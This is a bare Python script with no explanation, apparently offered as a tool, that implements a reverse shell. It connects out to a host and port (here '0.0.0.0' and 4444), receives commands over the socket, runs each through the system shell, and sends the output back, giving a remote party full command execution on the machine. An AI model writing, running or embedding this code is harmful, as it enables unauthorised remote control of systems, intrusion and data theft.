import socket
import subprocess

def rs(h, p):
  soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  soc.connect((h, p))
  while True:
    cmd = soc.recv(1024)
    proc = subprocess.Popen(cmd.decode('utf8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output= proc.stdout.read()+proc.stderr.read()
    soc.sendall(output)


rs('0.0.0.0', 4444)